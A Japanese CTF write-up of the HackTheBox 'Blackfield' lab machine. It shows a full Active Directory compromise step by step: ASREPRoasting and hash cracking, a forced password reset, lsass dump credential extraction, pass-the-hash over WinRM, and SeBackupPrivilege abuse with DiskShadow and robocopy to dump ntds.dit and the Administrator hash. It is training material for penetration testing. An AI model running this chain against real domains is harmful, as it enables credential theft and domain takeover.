---
title: "[Hard] Blackfield HackTheBox"
emoji: "🖥️"
type: "tech"
topics: ["hackthebox", "pentesting", "activedirectory"]
published: true
---

# TL;DR

- ASREPRoasting攻撃により`support`アカウントの認証情報を取得しました
- BloodHoundで`ForceChangePassword`権限を特定し、`audit2020`アカウントのパスワードを変更しました
- `forensic`共有から`lsass.dmp`ファイルを取得し、pypykatzで`svc_backup`アカウントの資格情報を抽出しました
- `SeBackupPrivilege`権限を悪用し、DiskShadowとRoboCopyで`ntds.dit`とSYSTEMハイブを取得しました
- secretsdumpでAdministratorのNTLMハッシュを入手し、完全なドメイン管理者権限を獲得しました


---

# 🔎 Enumeration

## port scan

nmapによるポートスキャンを実施しました。以下のポートが開いていることが確認できました。

```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-12-04 14:11:51Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

Active Directoryドメインコントローラとして動作していることが推測されます。

## enum4linux

認証情報なしでenum4linuxを実行し、ドメイン情報の取得を試みました。

```
 ============================================================
|    Domain Information via SMB session for 10.129.229.17    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: BLACKFIELD
DNS domain: BLACKFIELD.local
FQDN: DC01.BLACKFIELD.local
Derived membership: domain member
Derived domain: BLACKFIELD
```

ドメイン情報として`blackfield.local`が得られたので、`/etc/hosts`ファイルに追記します。

## smbclient

SMBクライアントで共有フォルダの列挙を行いました。いくつかのファイルサーバが見つかりました。`forensic`はアクセスできず、`profiles$`には多数のディレクトリが存在していました。

```
$ smbclient -U 'anonymous' -L  10.129.229.17
Password for [WORKGROUP\anonymous]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	profiles$       Disk
	SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available

$ smbclient -U 'Anonymous' \\\\10.129.229.17\\forensic
Password for [WORKGROUP\Anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

$ smbclient -U 'Anonymous' \\\\10.129.229.17\\profiles$
Password for [WORKGROUP\Anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 15:47:12 2020
  ..                                  D        0  Wed Jun  3 15:47:12 2020
  AAlleni                             D        0  Wed Jun  3 15:47:11 2020
  ABarteski                           D        0  Wed Jun  3 15:47:11 2020
  ABekesz                             D        0  Wed Jun  3 15:47:11 2020
  ABenzies                            D        0  Wed Jun  3 15:47:11 2020
[SNIP]
```

フォルダは全て空でしたが、フォルダ名がユーザ名である可能性が高いため、全てのフォルダ名を`users.txt`として保存しました。

## ASREPRoasting

取得したユーザ名リストを使用してASREPRoasting攻撃を実行しました。

```
$ python3 /opt/impacket/examples/GetNPUsers.py blackfield.local/  -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt
Impacket v0.14.0.dev0+20251203.31101.caba5fac - Copyright Fortra, LLC and its affiliated companies

[-] invalid principal syntax
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[SNIP]
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:c2c1616a8dfea6ddf9555180ccc2a4f5$68bed614a89588fe52a3d77c6dc42fc5ef1345e6fe56b64c88db762b3942810274496ca44c71d00c1a609db42287af7bbe3a9796aad886ea116803a4380c617f45dfa584e7aee388d1ff9ad34afc06acda2d331bc326a4cfc51a713e654b03f95993c0c4ec9309fc68f1972dc6ed10b757ac112f4515a2bbda08f46bdca0bca22802257322f6d7e50b4bb25c2fe2c32aff07aaf0ca72b15343f8b576a2f57730fc907a4ba62f26dbe1a9253bf90b25432fadf1d2509410e4dc2ace445839eb64ce06d89843e93f23be695befadd74b4249be89703fe18c72148476659c19b788c172a4734186eadf94b158c5decff8503bb247fe
```

hashcatでクラックすると、パスワードが割れました（`#00^BlackKnight`）。

```
$ cat hash.txt
$krb5asrep$23$support@BLACKFIELD.LOCAL:c2c1616a8dfea6ddf9555180ccc2a4f5$68bed614a89588fe52a3d77c6dc42fc5ef1345e6fe56b64c88db762b3942810274496ca44c71d00c1a609db42287af7bbe3a9796aad886ea116803a4380c617f45dfa584e7aee388d1ff9ad34afc06acda2d331bc326a4cfc51a713e654b03f95993c0c4ec9309fc68f1972dc6ed10b757ac112f4515a2bbda08f46bdca0bca22802257322f6d7e50b4bb25c2fe2c32aff07aaf0ca72b15343f8b576a2f57730fc907a4ba62f26dbe1a9253bf90b25432fadf1d2509410e4dc2ace445839eb64ce06d89843e93f23be695befadd74b4249be89703fe18c72148476659c19b788c172a4734186eadf94b158c5decff8503bb247fe

$  hashcat hash.txt /opt/SecLists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode

[SNIP]

$krb5asrep$23$support@BLACKFIELD.LOCAL:c2c1616a8dfea6ddf9555180ccc2a4f5$68bed614a89588fe52a3d77c6dc42fc5ef1345e6fe56b64c88db762b3942810274496ca44c71d00c1a609db42287af7bbe3a9796aad886ea116803a4380c617f45dfa584e7aee388d1ff9ad34afc06acda2d331bc326a4cfc51a713e654b03f95993c0c4ec9309fc68f1972dc6ed10b757ac112f4515a2bbda08f46bdca0bca22802257322f6d7e50b4bb25c2fe2c32aff07aaf0ca72b15343f8b576a2f57730fc907a4ba62f26dbe1a9253bf90b25432fadf1d2509410e4dc2ace445839eb64ce06d89843e93f23be695befadd74b4249be89703fe18c72148476659c19b788c172a4734186eadf94b158c5decff8503bb247fe:#00^BlackKnight

$ netexec smb blackfield.local -u 'support' -p '#00^BlackKnight'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```

## BloodHound

取得した認証情報を使用してBloodHound-pythonを実行しました。

```
$ bloodhound-ce-python -c all -d blackfield.local -u support -p '#00^BlackKnight' --zip -ns 10.129.229.17
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: blackfield.local
```

BloodHoundの分析により、`support`アカウントは`audit2020`に対して`ForceChangePassword`の権限を持っていることが判明しました。

![BloodHound分析結果](/images/blackfield_hard/screenshot_bloodhound.png)

パスワードを変更します。

```
$ net rpc password "audit2020" "newP@ssword2020" -U "blackfield.local"/"support"%"#00^BlackKnight" -S blackfield.local

$ netexec smb blackfield.local -u audit2020 -p 'newP@ssword2020'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:newP@ssword2020
```

## SMB (audit2020)

`audit2020`アカウントで`forensic`共有フォルダへのアクセス権限があることを確認しました。

```
$ smbclient -U audit2020  \\\\blackfield.local\\forensic
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 12:03:16 2020
  ..                                  D        0  Sun Feb 23 12:03:16 2020
  commands_output                     D        0  Sun Feb 23 17:14:37 2020
  memory_analysis                     D        0  Thu May 28 19:28:33 2020
  tools                               D        0  Sun Feb 23 12:39:08 2020

		5102079 blocks of size 4096. 1688180 blocks available
```

`memory_analysis`と`commands_output`のデータをローカルにダウンロードしました。

```
$ tree memory_analysis/
memory_analysis/
├── RuntimeBroker.zip
├── ServerManager.zip
├── WmiPrvSE.zip
├── conhost.zip
├── ctfmon.zip
├── dfsrs.zip
├── dllhost.zip
├── ismserv.zip
├── lsass.zip
├── mmc.zip
├── sihost.zip
├── smartscreen.zip
├── svchost.zip
├── taskhostw.zip
├── winlogon.zip
└── wlms.zip

1 directory, 16 files
```
# ⚒️ Exploit -user flag-

`lsass.zip`には`lsass.dmp`ファイルが圧縮されているため、pypykatzを使用して解析しました。

```
$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
[SNIP]
```

logonsessionに`svc_backup`のハッシュ値が含まれていました。

```
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
		AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
		AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
```

## evil-winrm

取得した`svc_backup`のハッシュ値を使用してWinRMでログインしました。

```
$ ruby /opt/evil-winrm/evil-winrm.rb -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920bb********************4b543
```

ユーザフラグを取得しました。

# 🔎 Enumeration (Internal)

## whoami

`svc_backup`アカウントの権限を確認したところ、`SeBackupPrivilege`を持っていることが判明しました。

```
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

# 👻 Exploit -root flag-

## SeBackupPrivilege


[この記事](https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#local-attack)の方法でAdministratorのファイルにアクセスを試みましたが、権限が不足していました。

```
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt .\root.txt
Opening input file. - Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
At line:1 char:1
+ Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt .\ ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception
    + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege
```


## SeBackupPrivilege AD Attack

Active DirectoryにおけるSeBackupPrivilege権限の悪用方法を調査しました。Windows Desktopの場合と異なり、ドメインコントローラからハッシュを抽出するには、SYSTEMハイブとともに`ntds.dit`ファイルが必要です。しかし、`ntds.dit`ファイルには課題があります。ターゲットマシンが稼働中だとファイルが使用中のため、従来の方法ではコピーできません。一般に、使用中のファイルはOSによってロックされ、直接アクセスが阻止されます。したがって、この制限を回避するにはDiskShadowの機能を使用する必要があります。これはWindowsに組み込まれた機能で、使用中のドライブのコピーを作成できます。

### Distributed Shell (DSH) ファイルの作成

DiskShadowをシェルで直接操作するのは難しいため、必要なコマンドをまとめたdshファイルを作成します。WindowsドライブC:の完全コピーを作成し、そこから`ntds.dit`を抽出します。自端末でdshファイルを作成し、C:をZ:にマップする指示を記述した後、`unix2dos`でWindows互換の形式に変換して確実に実行できるようにします。

```
$ cat raj.dsh
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:

$ unix2dos raj.dsh
unix2dos: converting file raj.dsh to DOS format...
```

WinRMセッションでTempディレクトリに移動し、`raj.dsh`をアップロードします。

```
cd C:\Windows\Temp
upload raj.dsh
```

dshファイルを指定してdiskshadowを実行すると、記述したコマンドが順次実行され、C:のコピーがZ:に作成されます。続いてRoboCopyでZ:からTempへファイルをコピーします。

```
*Evil-WinRM* PS C:\Windows\temp> diskshadow /s raj.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  12/25/2025 7:53:08 AM

-> set context persistent nowriters
-> add volume c: alias raj
-> create
Alias raj for shadow ID {4827e613-1947-4d1e-9cd1-c053f1485053} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {cbcc88cc-bed5-458e-b211-a5fa59febc93} set as environment variable.

Querying all shadow copies with the shadow copy set ID {cbcc88cc-bed5-458e-b211-a5fa59febc93}

	* Shadow copy ID = {4827e613-1947-4d1e-9cd1-c053f1485053}		%raj%
		- Shadow copy set: {cbcc88cc-bed5-458e-b211-a5fa59febc93}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 12/25/2025 7:53:10 AM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %raj% z:
-> %raj% = {4827e613-1947-4d1e-9cd1-c053f1485053}
The shadow copy was successfully exposed as z:\.
->
*Evil-WinRM* PS C:\Windows\temp> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, December 25, 2025 7:53:29 AM
   Source : z:\windows\ntds\
     Dest : C:\Windows\temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                   1	z:\windows\ntds\
	    New File  		  18.0 m	ntds.dit
  0.0%
  0.3%
[SNIP]
 99.6%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           121770116 Bytes/sec.
   Speed :            6967.741 MegaBytes/min.
   Ended : Thursday, December 25, 2025 7:53:30 AM

*Evil-WinRM* PS C:\Windows\temp> dir


    Directory: C:\Windows\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/25/2025   7:53 AM            606 2025-12-25_7-53-10_DC01.cab
-a----       12/25/2025   5:30 AM         218154 MpCmdRun.log
-a----       12/25/2025   5:00 AM       18874368 ntds.dit
-a----       12/25/2025   7:50 AM             84 raj.dsh
-a----       12/25/2025   5:01 AM            102 silconfig.log
------       12/25/2025   5:00 AM         638764 vmware-vmsvc.log
------       12/25/2025   5:01 AM          37921 vmware-vmusr.log
-a----       12/25/2025   5:00 AM           3360 vmware-vmvss.log
```

`ntds.dit`取得後、SYSTEMハイブを`reg save`で抽出し、両ファイルをTempから`download`コマンドで自端末へ転送します。

```
reg save hklm\system c:\Windows\Temp\system
cd C:\Windows\Temp
download ntds.dit
download system
```

## ハッシュの抽出とアクセス

自端末でImpacketの`secretsdump`を用いて`ntds.dit`とSYSTEMハイブからハッシュを抽出し、Administratorのハッシュ取得に成功しました。

```
$ secretsdump.py -ntds ntds.dit -system system local |tee secretsdump.txt

$ grep -i admin secretsdump.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223
Administrator:des-cbc-md5:5d25a84ac8c229c1
```

Administratorのハッシュ値を使用してWinRMでアクセスし、rootフラグを取得しました。

```
$ ruby /opt/evil-winrm/evil-winrm.rb -i blackfield.local -u Administrator -H '184fb5e5178480be64824d4cd53b99ee'

[SNIP]

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4375a62*****************955cb

```

rootフラグとuserフラグの両方を取得し、Blackfieldマシンの完全な攻略に成功しました。
